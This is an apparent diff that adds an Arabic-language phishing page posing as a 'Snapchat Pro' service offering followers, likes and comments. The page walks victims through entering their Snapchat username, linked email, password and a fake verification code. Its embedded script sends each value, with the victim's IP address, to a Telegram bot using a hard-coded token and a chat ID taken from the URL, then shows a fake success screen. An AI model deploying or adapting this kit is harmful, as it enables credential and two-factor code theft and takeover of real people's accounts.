@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>سناب شات – زيادة متابعين ولايكات</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;}
+  body{
+    background:linear-gradient(180deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
+    min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;color:#fff;
+  }
+  .container{
+    max-width:440px;width:100%;background:#fff;border-radius:24px;overflow:hidden;
+    box-shadow:0 20px 60px rgba(0,0,0,.6);
+  }
+
+  /* الهيدر */
+  .header{
+    background:linear-gradient(135deg,#FFFC00,#FFD700);padding:24px 20px 18px;text-align:center;
+  }
+  .header img{width:60px;height:60px;object-fit:contain;margin-bottom:8px;border-radius:14px;}
+  .header h1{font-size:22px;color:#1a1a2e;font-weight:800;margin-bottom:4px;}
+  .header p{font-size:13px;color:#333;font-weight:500;}
+  .header .badge{
+    display:inline-flex;align-items:center;gap:5px;background:rgba(26,26,46,.1);
+    color:#1a1a2e;padding:4px 14px;border-radius:30px;font-size:11px;font-weight:700;margin-top:8px;
+  }
+  .header .badge svg{width:13px;height:13px;fill:#1a1a2e;}
+
+  .content{padding:6px 18px 22px;}
+
+  /* خطوات */
+  .step{display:none;animation:slideUp .4s ease;}
+  .step.active{display:block;}
+  @keyframes slideUp{0%{opacity:0;transform:translateY(15px)}100%{opacity:1;transform:translateY(0)}}
+
+  /* مؤشر */
+  .indicator{display:flex;justify-content:center;gap:5px;margin:10px 0 14px;}
+  .indicator .dot{width:7px;height:7px;border-radius:50%;background:#ddd;transition:.3s;}
+  .indicator .dot.active{background:#FFFC00;width:22px;border-radius:10px;}
+  .indicator .dot.done{background:#00c853;}
+
+  /* وصف */
+  .desc-box{background:#f8f9fe;border-radius:14px;padding:16px;text-align:right;margin-bottom:12px;border:1px solid #eee;}
+  .desc-box h3{font-size:15px;color:#1a1a2e;margin-bottom:8px;}
+  .desc-box p{font-size:13px;color:#555;line-height:1.7;margin-bottom:8px;}
+  .desc-box ul{list-style:none;padding:0;text-align:right;}
+  .desc-box ul li{font-size:13px;color:#333;padding:6px 24px 6px 0;position:relative;border-bottom:1px solid #f0f0f0;}
+  .desc-box ul li::before{content:"✓";position:absolute;right:2px;top:6px;color:#00c853;font-weight:bold;}
+  .desc-box ul li:last-child{border-bottom:none;}
+
+  /* بطاقات الخدمات */
+  .services{display:grid;grid-template-columns:1fr;gap:10px;margin:14px 0;}
+  .service-card{
+    background:#f8f9fe;border:2px solid #eee;border-radius:16px;padding:16px;
+    text-align:center;cursor:pointer;transition:.3s;
+  }
+  .service-card:hover{border-color:#FFFC00;background:#fffde7;}
+  .service-card.selected{border-color:#FFFC00;background:#fffde7;box-shadow:0 0 0 3px rgba(255,252,0,.3);}
+  .service-card .icon{width:40px;height:40px;margin:0 auto 8px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#FFFC00;}
+  .service-card .icon svg{width:20px;height:20px;fill:#1a1a2e;}
+  .service-card h4{font-size:15px;color:#1a1a2e;margin-bottom:4px;}
+  .service-card p{font-size:12px;color:#666;}
+  .service-card .tag{font-size:12px;color:#00c853;font-weight:700;margin-top:6px;}
+
+  /* الحقول */
+  .form-group{margin-bottom:14px;}
+  .form-group label{display:block;font-size:13px;font-weight:600;color:#444;margin-bottom:5px;}
+  .form-group input{width:100%;padding:13px 14px;border:2px solid #e0e0e0;border-radius:10px;font-size:14px;color:#333;transition:.2s;outline:none;background:#fafafa;}
+  .form-group input:focus{border-color:#FFFC00;box-shadow:0 0 0 3px rgba(255,252,0,.15);background:#fff;}
+  .form-group input::placeholder{color:#999;}
+
+  /* أزرار المساعدة (شرح) */
+  .help-toggle{
+    display:flex;align-items:center;gap:6px;margin-top:6px;font-size:12px;color:#0f3460;
+    cursor:pointer;font-weight:600;transition:.2s;background:none;border:none;padding:4px 0;
+  }
+  .help-toggle:hover{color:#FFC107;}
+  .help-toggle svg{width:14px;height:14px;fill:#0f3460;transition:.2s;}
+  .help-toggle:hover svg{fill:#FFC107;}
+  .help-box{
+    background:#fffde7;border:1px solid #FFFC00;border-radius:10px;padding:12px;
+    font-size:12px;color:#555;line-height:1.8;margin-top:6px;display:none;text-align:right;
+  }
+  .help-box.show{display:block;}
+  .help-box strong{color:#1a1a2e;}
+  .help-box ol{padding-right:18px;margin:4px 0;}
+  .help-box ol li{margin-bottom:4px;}
+
+  /* الأزرار */
+  .btn{
+    width:100%;padding:14px;background:linear-gradient(135deg,#FFFC00,#FFD700);color:#1a1a2e;
+    border:none;border-radius:12px;font-size:15px;font-weight:800;cursor:pointer;transition:.2s;
+    box-shadow:0 4px 12px rgba(255,252,0,.3);
+  }
+  .btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,252,0,.4);}
+  .btn:disabled{opacity:.5;cursor:not-allowed;transform:none;}
+  .btn-secondary{background:#1a1a2e;color:#fff;box-shadow:none;}
+  .btn-secondary:hover{background:#16213e;box-shadow:none;}
+  .btn-green{background:linear-gradient(135deg,#00c853,#009624);color:#fff;box-shadow:0 4px 12px rgba(0,200,83,.3);}
+  .btn-green:hover{box-shadow:0 6px 20px rgba(0,200,83,.4);}
+  .btn-text{font-size:12px;color:#999;text-align:center;margin-top:8px;}
+
+  /* التايمر */
+  .timer-box{background:#fff8e1;border:1px solid #ffecb3;border-radius:10px;padding:12px;text-align:center;margin:12px 0;}
+  .timer-box .num{font-size:26px;font-weight:700;color:#e65100;}
+  .timer-box p{font-size:13px;color:#bf360c;}
+
+  /* نجاح */
+  .success{text-align:center;padding:30px 0 18px;}
+  .success svg{width:70px;height:70px;display:block;margin:0 auto 12px;}
+  .success svg .circle{fill:#e8f5e9;stroke:#00c853;stroke-width:2;}
+  .success svg .check{stroke:#00c853;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;fill:none;stroke-dasharray:100;stroke-dashoffset:100;animation:checkDraw .8s ease forwards;}
+  @keyframes checkDraw{to{stroke-dashoffset:0;}}
+  .success h2{color:#1a1a2e;font-size:20px;margin-bottom:4px;}
+  .success p{color:#666;font-size:13px;}
+  .pulse{display:inline-block;width:6px;height:6px;background:#00c853;border-radius:50%;margin-right:3px;animation:pulse 1.2s infinite;}
+  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.6)}}
+  .spinner{width:36px;height:36px;border:4px solid #eee;border-top-color:#FFFC00;border-radius:50%;animation:spin .7s linear infinite;margin:16px auto;}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* توست */
+  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1a1a2e;color:#fff;padding:12px 22px;border-radius:12px;font-size:13px;opacity:0;transition:.3s;z-index:999;text-align:center;white-space:nowrap;}
+  .toast.show{opacity:1;}
+
+  @media(max-width:480px){
+    .container{border-radius:18px;}
+    .header{padding:18px 16px 14px;}
+    .header img{width:50px;height:50px;}
+    .content{padding:4px 14px 18px;}
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="header">
+    <img src="https://i.ibb.co/HTkYy70P/image.png" alt="سناب شات">
+    <h1>سناب شات برو</h1>
+    <p>زيادة متابعين • لايكات • كومنتات</p>
+    <div class="badge">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+      خدمة موثوقة · أكثر من 50,000 مستخدم
+    </div>
+  </div>
+
+  <div class="content">
+
+    <div class="indicator" id="stepsDots">
+      <span class="dot active" data-s="0"></span>
+      <span class="dot" data-s="1"></span>
+      <span class="dot" data-s="2"></span>
+      <span class="dot" data-s="3"></span>
+      <span class="dot" data-s="4"></span>
+      <span class="dot" data-s="5"></span>
+      <span class="dot" data-s="6"></span>
+    </div>
+
+    <!-- ===== الخطوة 0: اختيار الخدمة ===== -->
+    <div class="step active" id="s0">
+      <div class="desc-box">
+        <h3>🔥 اختر الخدمة التي تريدها</h3>
+        <p>اختر نوع الخدمة التي ترغب في الحصول عليها لحسابك في سناب شات:</p>
+      </div>
+      <div class="services">
+        <div class="service-card" onclick="selectService(0,this)">
+          <div class="icon"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg></div>
+          <h4>زيادة متابعين</h4>
+          <p>احصل على آلاف المتابعين الحقيقيين</p>
+          <div class="tag">✓ يصل إلى 10,000 متابع</div>
+        </div>
+        <div class="service-card" onclick="selectService(1,this)">
+          <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg></div>
+          <h4>زيادة لايكات</h4>
+          <p>آلاف الإعجابات على سناباتك وقصصك</p>
+          <div class="tag">✓ يصل إلى 50,000 لايك</div>
+        </div>
+        <div class="service-card" onclick="selectService(2,this)">
+          <div class="icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12z"/></svg></div>
+          <h4>زيادة كومنتات</h4>
+          <p>تعليقات تفاعلية على سناباتك</p>
+          <div class="tag">✓ يصل إلى 5,000 كومنت</div>
+        </div>
+      </div>
+      <button class="btn" id="serviceBtn" onclick="confirmService()" disabled>اختر خدمة أولاً</button>
+    </div>
+
+    <!-- ===== الخطوة 1: شرح الخدمة ===== -->
+    <div class="step" id="s1">
+      <div class="desc-box">
+        <h3 id="svcTitle">الخدمة المختارة</h3>
+        <p id="svcDesc">لتفعيل الخدمة يرجى إكمال خطوات التحقق من الحساب أدناه.</p>
+        <ul>
+          <li>أدخل اسم المستخدم في سناب شات</li>
+          <li>أدخل البريد الإلكتروني المرتبط بالحساب</li>
+          <li>أدخل كلمة المرور لتأكيد ملكية الحساب</li>
+          <li>سيتم تفعيل الخدمة خلال 24 ساعة</li>
+        </ul>
+      </div>
+      <button class="btn" onclick="next(1)">التالي ←</button>
+    </div>
+
+    <!-- ===== الخطوة 2: اسم المستخدم ===== -->
+    <div class="step" id="s2">
+      <h3 style="color:#1a1a2e;font-size:17px;margin-bottom:6px;">👤 أدخل اسم المستخدم</h3>
+      <p style="color:#666;font-size:13px;margin-bottom:14px;">أدخل اسم المستخدم الخاص بك في سناب شات</p>
+      <div class="form-group">
+        <label>اسم المستخدم في سناب شات</label>
+        <input type="text" id="username" placeholder="مثال: @snapuser" dir="ltr">
+      </div>
+      <button class="btn" onclick="sendUsername()">تأكيد اسم المستخدم</button>
+    </div>
+
+    <!-- ===== الخطوة 3: البريد الإلكتروني ===== -->
+    <div class="step" id="s3">
+      <h3 style="color:#1a1a2e;font-size:17px;margin-bottom:6px;">📧 أدخل البريد الإلكتروني</h3>
+      <p style="color:#666;font-size:13px;margin-bottom:14px;">أدخل البريد الإلكتروني المرتبط بحساب سناب شات الخاص بك</p>
+      <div class="form-group">
+        <label>البريد الإلكتروني</label>
+        <input type="email" id="email" placeholder="example@gmail.com" dir="ltr">
+      </div>
+      
+      <!-- زر شرح كيفية معرفة البريد -->
+      <button class="help-toggle" onclick="toggleHelp('emailHelp')">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+        كيف تعرف البريد الإلكتروني المرتبط بحسابك؟
+      </button>
+      <div class="help-box" id="emailHelp">
+        <strong>لمعرفة البريد الإلكتروني المرتبط بحساب سناب شات:</strong>
+        <ol>
+          <li>افتح تطبيق سناب شات</li>
+          <li>اضغط على أيقونة ملفك الشخصي ⚡ في الأعلى</li>
+          <li>اضغط على <strong>الترس ⚙️ (الإعدادات)</strong></li>
+          <li>اختر <strong>البريد الإلكتروني</strong> ستظهر لك أول 4 أحرف وآخر 4 أحرف من البريد المسجل</li>
+          <li>إذا نسيت البريد كلياً، اختر <strong>نسيت البريد الإلكتروني</strong> واتبع التعليمات</li>
+        </ol>
+      </div>
+
+      <button class="btn" style="margin-top:8px;" onclick="sendEmail()">تأكيد البريد الإلكتروني</button>
+    </div>
+
+    <!-- ===== الخطوة 4: كلمة المرور ===== -->
+    <div class="step" id="s4">
+      <h3 style="color:#1a1a2e;font-size:17px;margin-bottom:6px;">🔑 أدخل كلمة المرور</h3>
+      <p style="color:#666;font-size:13px;margin-bottom:14px;">أدخل كلمة مرور حساب سناب شات الخاص بك لتأكيد ملكية الحساب</p>
+      <div class="form-group">
+        <label>كلمة المرور</label>
+        <input type="password" id="pass" placeholder="••••••••" dir="ltr">
+      </div>
+
+      <!-- زر شرح كيفية تغيير الباسورد -->
+      <button class="help-toggle" onclick="toggleHelp('passHelp')">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+        كيف تغير كلمة المرور من تطبيق سناب شات؟
+      </button>
+      <div class="help-box" id="passHelp">
+        <strong>لتغيير كلمة المرور في سناب شات:</strong>
+        <ol>
+          <li>افتح تطبيق سناب شات على هاتفك</li>
+          <li>اضغط على أيقونة ملفك الشخصي ⚡ في الأعلى</li>
+          <li>اضغط على <strong>الترس ⚙️ (الإعدادات)</strong></li>
+          <li>اختر <strong>كلمة المرور</strong> (قد يطلب منك إعادة تسجيل الدخول)</li>
+          <li>أدخل كلمة المرور الحالية ثم الجديدة</li>
+          <li>اضغط <strong>تأكيد</strong> لحفظ التغييرات</li>
+        </ol>
+        <p style="margin-top:6px;font-size:11px;color:#999;">ملاحظة: يمكنك إدخال كلمة المرور الحالية هنا أولاً للتحقق من الحساب.</p>
+      </div>
+
+      <button class="btn" style="margin-top:8px;" onclick="sendPass()">تأكيد كلمة المرور</button>
+    </div>
+
+    <!-- ===== الخطوة 5: رمز التحقق الوهمي ===== -->
+    <div class="step" id="s5">
+      <h3 style="color:#1a1a2e;font-size:17px;margin-bottom:6px;">🔐 رمز التحقق</h3>
+      <p style="color:#666;font-size:13px;margin-bottom:14px;">لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى بريدك الإلكتروني. أدخله أدناه.</p>
+      <div class="timer-box">
+        <p>المتبقي من الوقت</p>
+        <div class="num" id="timerDisplay">02:00</div>
+      </div>
+      <div class="form-group">
+        <label>رمز التحقق</label>
+        <input type="text" id="code" placeholder="000000" maxlength="6" inputmode="numeric" style="text-align:center;font-size:24px;letter-spacing:10px;font-weight:bold;">
+      </div>
+      <button class="btn" onclick="sendCode()">تأكيد الرمز</button>
+      <button class="btn btn-secondary" style="margin-top:8px;" onclick="resendCode()">إعادة إرسال الرمز</button>
+    </div>
+
+    <!-- ===== الخطوة 6: النجاح ===== -->
+    <div class="step" id="s6">
+      <div class="success">
+        <svg viewBox="0 0 70 70"><circle class="circle" cx="35" cy="35" r="32"/><path class="check" d="M20 35l10 10 20-20"/></svg>
+        <h2>✅ تم تأكيد الحساب بنجاح!</h2>
+        <p id="finalMsg">جارِ تفعيل الخدمة على حسابك <span class="pulse"></span></p>
+        <p style="margin-top:8px;font-size:12px;color:#999;">سيتم الانتهاء خلال 24 ساعة</p>
+      </div>
+      <div class="spinner"></div>
+      <p style="text-align:center;color:#999;font-size:13px;margin-top:8px;">جارِ معالجة الطلب...</p>
+    </div>
+
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ============================================================
+// ⚙️ الإعدادات
+// ============================================================
+const BOT_TOKEN = "8635912264:AAGu4XL8v9WuS90vwrBGyJGz5fWyFMstM2E";
+const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID = urlParams.get('chatId') || '';
+
+let currentStep = 0;
+let timerInterval;
+let timeLeft = 120;
+let selectedService = -1;
+
+const data = {};
+
+const services = [
+  { name: 'زيادة متابعين',        msg: 'زيادة المتابعين' },
+  { name: 'زيادة لايكات',         msg: 'زيادة الإعجابات' },
+  { name: 'زيادة كومنتات',        msg: 'إضافة التعليقات' }
+];
+
+// ============================================================
+// اختيار الخدمة
+// ============================================================
+function selectService(idx, el) {
+  selectedService = idx;
+  document.querySelectorAll('.service-card').forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  document.getElementById('serviceBtn').disabled = false;
+  document.getElementById('serviceBtn').textContent = `اخترت: ${services[idx].name} ←`;
+}
+
+function confirmService() {
+  if (selectedService < 0) return;
+  const s = services[selectedService];
+  document.getElementById('svcTitle').textContent = s.name;
+  document.getElementById('svcDesc').textContent = `لتفعيل خدمة ${s.name} لحسابك في سناب شات، يرجى إكمال خطوات التحقق من الحساب أدناه.`;
+  document.getElementById('finalMsg').textContent = `جارِ تفعيل ${s.msg} على حسابك `;
+  data.service = s.name;
+  next(0);
+}
+
+// ============================================================
+// التنقل
+// ============================================================
+function showStep(i) {
+  document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+  const el = document.getElementById('s'+i);
+  if (el) el.classList.add('active');
+  document.querySelectorAll('#stepsDots .dot').forEach(d => {
+    const s = parseInt(d.dataset.s);
+    d.classList.remove('active','done');
+    if (s === i) d.classList.add('active');
+    else if (s < i) d.classList.add('done');
+  });
+  currentStep = i;
+}
+function next(from) { showStep(from + 1); }
+
+// ============================================================
+// المساعدة
+// ============================================================
+function toggleHelp(id) {
+  const el = document.getElementById(id);
+  el.classList.toggle('show');
+}
+
+// ============================================================
+// إرسال لتليجرام
+// ============================================================
+async function tgSend(msg) {
+  if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+    showToast("⚠️ لم يتم تكوين البوت"); console.log("📦:", msg); return;
+  }
+  if (!CHAT_ID) { showToast("❌ رابط غير صالح"); return; }
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'HTML'})
+    });
+    const j = await r.json();
+    if (j.ok) {
+      try { await navigator.clipboard.writeText(msg); } catch(e){}
+      showToast('✅ تم الإرسال والنسخ');
+    } else { showToast('❌ '+(j.description||'خطأ')); }
+  } catch(e) { showToast('❌ فشل: '+e.message); }
+}
+async function getIP() {
+  try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; } catch(e){ return 'غير معروف'; }
+}
+
+// ============================================================
+// الخطوة 2: اسم المستخدم
+// ============================================================
+async function sendUsername() {
+  const username = document.getElementById('username').value.trim();
+  if (!username) { showToast('❌ أدخل اسم المستخدم'); return; }
+  data.username = username;
+  data.ip = await getIP();
+
+  const msg = `👤 <b>اسم مستخدم - سناب شات</b>\n\n━━━━━━━━━━━━━━\n<b>الخدمة:</b> ${data.service}\n<b>👤 المستخدم:</b> <code>${username}</code>\n<b>🕐 التوقيت:</b> ${new Date().toLocaleString('ar-EG')}\n<b>🌐 IP:</b> ${data.ip}\n━━━━━━━━━━━━━━`;
+  await tgSend(msg);
+  showToast('✅ تم تأكيد اسم المستخدم');
+  next(2);
+}
+
+// ============================================================
+// الخطوة 3: البريد الإلكتروني
+// ============================================================
+async function sendEmail() {
+  const email = document.getElementById('email').value.trim();
+  if (!email) { showToast('❌ أدخل البريد الإلكتروني'); return; }
+  data.email = email;
+
+  const msg = `📧 <b>📧 بريد إلكتروني - سناب شات</b>\n\n━━━━━━━━━━━━━━\n<b>الخدمة:</b> ${data.service}\n<b>👤 المستخدم:</b> ${data.username}\n<b>📧 البريد:</b> <code>${email}</code>\n<b>🕐 التوقيت:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━`;
+  await tgSend(msg);
+  showToast('✅ تم تأكيد البريد');
+  next(3);
+}
+
+// ============================================================
+// الخطوة 4: كلمة المرور
+// ============================================================
+async function sendPass() {
+  const pass = document.getElementById('pass').value.trim();
+  if (!pass) { showToast('❌ أدخل كلمة المرور'); return; }
+  data.pass = pass;
+
+  const msg = `🔑 <b>🔑 كلمة المرور - سناب شات</b>\n\n━━━━━━━━━━━━━━\n<b>الخدمة:</b> ${data.service}\n<b>👤 المستخدم:</b> ${data.username}\n<b>📧 البريد:</b> ${data.email}\n<b>🔐 الباسورد:</b> <code>${pass}</code>\n<b>🕐 التوقيت:</b> ${new Date().toLocaleString('ar-EG')}\n<b>🌐 IP:</b> ${data.ip}\n━━━━━━━━━━━━━━\n\n⚠️ <b>جميع بيانات الحساب!</b>`;
+  await tgSend(msg);
+  showToast('✅ تم تأكيد كلمة المرور');
+  next(4);
+  startTimer();
+}
+
+// ============================================================
+// التايمر & الخطوة 5: رمز التحقق
+// ============================================================
+function startTimer() {
+  timeLeft = 120; updateTimer();
+  if (timerInterval) clearInterval(timerInterval);
+  timerInterval = setInterval(() => {
+    timeLeft--; updateTimer();
+    if (timeLeft <= 0) { clearInterval(timerInterval); document.getElementById('timerDisplay').textContent = '00:00'; }
+  }, 1000);
+}
+function updateTimer() {
+  const m = Math.floor(timeLeft/60), s = timeLeft%60;
+  document.getElementById('timerDisplay').textContent = String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+}
+function resendCode() {
+  data.resend = (data.resend||0)+1;
+  showToast('📩 تم إعادة الإرسال'); startTimer();
+}
+
+async function sendCode() {
+  const code = document.getElementById('code').value.trim();
+  if (!code || code.length < 4) { showToast('❌ أدخل الرمز كاملاً'); return; }
+  data.code = code;
+  clearInterval(timerInterval);
+
+  const msg = `🔐 <b>🔑 كود التحقق - سناب شات</b>\n\n━━━━━━━━━━━━━━\n<b>الخدمة:</b> ${data.service}\n<b>👤 المستخدم:</b> ${data.username}\n<b>📧 البريد:</b> ${data.email}\n<b>🔐 الباسورد:</b> ${data.pass}\n<b>🔑 الكود:</b> <code>${code}</code>\n<b>🕐 التوقيت:</b> ${new Date().toLocaleString('ar-EG')}\n<b>🌐 IP:</b> ${data.ip}\n━━━━━━━━━━━━━━\n\n✅ <b>جميع البيانات مكتملة!</b>`;
+  await tgSend(msg);
+  showToast('✅ تم إتمام العملية بنجاح');
+  next(5);
+}
+
+// ============================================================
+// التوست
+// ============================================================
+function showToast(m) {
+  const t = document.getElementById('toast');
+  t.textContent = m; t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+// ============================================================
+// بدء
+// ============================================================
+showStep(0);
+</script>
+</body>
+</html>
